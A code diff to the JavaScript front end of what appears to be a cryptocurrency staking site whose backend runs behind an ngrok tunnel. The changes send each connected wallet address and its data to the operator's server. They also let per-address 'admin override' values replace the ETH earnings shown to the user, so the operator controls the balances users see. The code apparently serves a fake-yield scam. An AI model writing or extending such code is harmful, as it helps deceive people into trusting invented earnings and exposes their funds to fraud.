@@ -60,7 +60,10 @@ async function saveUserData() {
     try {
         await fetch(`${API_BASE_URL}/api/user-data`, {
             method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
+            headers: { 
+                'Content-Type': 'application/json',
+                'ngrok-skip-browser-warning': 'true' 
+            },
             body: JSON.stringify({ address: userAddress, data: dataToSave })
         });
         console.log("User data sent to server.");
@@ -157,31 +160,37 @@ function updateTotalFunds() {
 async function updateInterest() {
     if (!stakingStartTime || !grossOutputValue || !cumulativeValue || !userAddress) return;
     let grossOutput, cumulative;
+    let overrideApplied = false;
+
     try {
-        const response = await fetch(`${API_BASE_URL}/api/all-data`);
+        const response = await fetch(`${API_BASE_URL}/api/all-data`, {
+            cache: 'no-cache', // ** 强制浏览器不使用缓存 **
+            headers: { 'ngrok-skip-browser-warning': 'true' }
+        });
         if (response.ok) {
             const allData = await response.json();
             const userOverrides = allData.overrides[userAddress] || {};
-            if (typeof userOverrides.grossOutput === 'number') {
+            
+            if (typeof userOverrides.grossOutput === 'number' && typeof userOverrides.cumulative === 'number') {
                 grossOutput = userOverrides.grossOutput;
-            }
-            if (typeof userOverrides.cumulative === 'number') {
                 cumulative = userOverrides.cumulative;
+                overrideApplied = true;
+                console.log("Admin override applied!");
             }
         }
     } catch (error) {
         // If server is unreachable, just continue with local calculation
     }
-    if (typeof grossOutput === 'undefined') {
+
+    if (!overrideApplied) {
         const currentTime = Date.now();
         const elapsedSeconds = Math.floor((currentTime - stakingStartTime) / 1000);
         const baseInterestRate = 0.000001;
         const interestRate = baseInterestRate * pledgedAmount;
         grossOutput = elapsedSeconds * interestRate;
-    }
-     if (typeof cumulative === 'undefined') {
         cumulative = grossOutput - claimedInterest;
     }
+
     grossOutputValue.textContent = `${grossOutput.toFixed(7)} ETH`;
     cumulativeValue.textContent = `${cumulative.toFixed(7)} ETH`;
 }
@@ -441,7 +450,9 @@ function disconnectWallet() {
 async function getEthPrices() {
     try {
         updateStatus("Fetching latest prices...");
-        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd,usdt');
+        const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd,usdt', {
+            headers: { 'ngrok-skip-browser-warning': 'true' }
+        });
         if (!response.ok) throw new Error('Network response was not ok');
         const data = await response.json();
         const prices = { usd: data.ethereum.usd, usdt: data.ethereum.usdt, usdc: data.ethereum.usd, weth: data.ethereum.usdt };
